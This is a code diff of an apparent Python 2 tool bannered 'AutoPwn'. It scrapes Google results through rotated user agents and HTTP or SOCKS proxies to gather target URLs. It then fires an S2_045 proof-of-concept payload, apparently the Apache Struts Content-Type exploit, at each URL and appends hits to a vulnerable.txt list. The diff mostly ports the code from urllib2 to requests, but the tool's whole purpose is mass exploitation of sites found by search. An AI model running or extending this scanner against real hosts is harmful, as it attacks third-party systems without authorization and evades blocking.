@@ -5,14 +5,13 @@
 # with google search results crawler
 #
 
-import sys, os
-import Queue
-import threading
-import StringIO
-import ConfigParser
+import sys
+import os
+import time
 import socket
-import urllib2
-import time, signal, gzip
+import requests
+import ConfigParser
+import threading, Queue
 import re, random, types
 from bs4 import BeautifulSoup
 from atexit import register
@@ -20,12 +19,15 @@ from atexit import register
 
 cp = ConfigParser.SafeConfigParser()
 cp.read('crawler.conf')
-http_proxy = {}
+proxies = {}
 if cp.has_option('http', 'http_addr') and cp.has_option('http', 'http_port'):
-    http_proxy = {
-        'host': cp.get('http', 'http_addr'),
-        'port': int(cp.get('http', 'http_port'))
-    }
+    http_addr = cp.get('http', 'http_addr')
+    http_port = int(cp.get('http', 'http_port'))
+    proxies['https'] = 'https://%s:%d' % (http_addr, http_port)
+elif cp.has_option('socks', 'socks_addr') and cp.has_option('socks', 'socks_port'):
+    socks_addr = cp.get('socks', 'socks_addr')
+    socks_port = int(cp.get('socks', 'socks_port'))
+    proxies['https'] = 'socks5://%s:%d' % (socks_addr, socks_port)
 base_url = cp.get('crawler', 'base_url')
 results_per_page = 10
 user_agents = []
@@ -101,46 +103,40 @@ class GoogleAPI:
 
     # search web
     def search(self, query, lang='en', num=results_per_page):
-        if http_proxy:
-            proxy_support = urllib2.ProxyHandler({'http': 'http://%(host)s:%(port)d' % http_proxy})
-            opener = urllib2.build_opener(proxy_support)
-            urllib2.install_opener(opener)
-        query = urllib2.quote(query)
         if num % results_per_page == 0:
             pages = num / results_per_page
         else:
             pages = num / results_per_page + 1
         for p in xrange(0, pages):
             start = p * results_per_page
-            url = '%s/search?hl=%s&num=%d&start=%s&q=%s' % (base_url, lang, results_per_page, start, query)
+            url = '%s/search' % base_url
+            payload = {
+                'q': query,
+                'start': start,
+                'num': results_per_page,
+                'hl': lang
+            }
             retry = 3
             while retry > 0:
                 try:
-                    request = urllib2.Request(url)
                     length = len(user_agents)
                     index = random.randint(0, length - 1)
                     user_agent = user_agents[index]
-                    request.add_header('User-agent', user_agent)
-                    request.add_header('connection', 'keep-alive')
-                    request.add_header('Accept-Encoding', 'gzip')
-                    request.add_header('referer', base_url)
-                    response = urllib2.urlopen(request)
-                    html = response.read()
-                    if response.headers.get('content-encoding', None) == 'gzip':
-                        html = gzip.GzipFile(fileobj=StringIO.StringIO(html)).read()
+                    headers = {
+                        'user-agent': user_agent,
+                        'connection': 'keep-alive',
+                        'accept-encoding': 'gzip',
+                        'referer': base_url
+                    }
+                    response = requests.get(url, headers=headers, params=payload, proxies=proxies)
+                    html = response.text
                     self.extract_search_results(html)
                     break
-                except urllib2.URLError, e:
-                    with lock:
-                        print '\033[0;31m[!] [SEARCH_ERROR]\033[0m', e
-                    self.random_sleep()
-                    retry = retry - 1
-                    continue
                 except Exception, e:
                     with lock:
                         print '\033[0;31m[!] [SEARCH_ERROR]\033[0m', e
-                    retry = retry - 1
                     self.random_sleep()
+                    retry = retry - 1
                     continue
 
 
@@ -186,14 +182,17 @@ def poccheck(timeout):
     while True:
         url = url_queue.get()
         with lock:
-            print '\033[0;32m[*] [POC] %s\033[0m' % url
-        request = urllib2.Request(url)
-        request.add_header("Content-Type", S2_045["poc"])
-        request.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0")
+            print '\033[0;33m[*] [POC] %s\033[0m' % url
+        headers = {
+            'content-type': S2_045["poc"],
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'
+        }
+        response = requests.get(url, headers=headers)
         try:
-            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
+            res_html = response.text
         except Exception, e:
             with lock:
+                print '\033[0;31m[!] [POC_ERROR] %s\033[0m' % url
                 print '\033[0;31m[!] [POC_ERROR]\033[0m', e
         else:
             if S2_045['key'] in res_html:
@@ -201,7 +200,7 @@ def poccheck(timeout):
                     print '\033[1;32m[*] [VULNERABLE] %s\033[0m' % url
                     vuln_queue.put(url)
                     vuln_num += 1
-                    with open('./vulnerable.txt', 'w') as vulnerable:
+                    with open('./vulnerable.txt', 'a') as vulnerable:
                         vulnerable.write(url+'\n')
 
 
@@ -218,7 +217,8 @@ def banner():
     print " / ___ \ |_| | || (_) |  __/ \ V  V /| | | |"
     print "/_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|"
     print "                                            "
-    print "                              {alpha 1.0.3} "
+    print "                              {alpha 1.0.4} "
+    print "                                            "
 
 
 @register
@@ -236,8 +236,8 @@ def atexit():
 
 def main():
     banner()
-    if http_proxy:
-        print '[*] [PROXY] %(host)s:%(port)d' % http_proxy
+    if proxies:
+        print '[*] [PROXY] %s' % proxies['https']
     print ''
     print '[*] starting at', time.strftime("%H:%M:%S")
     print ''
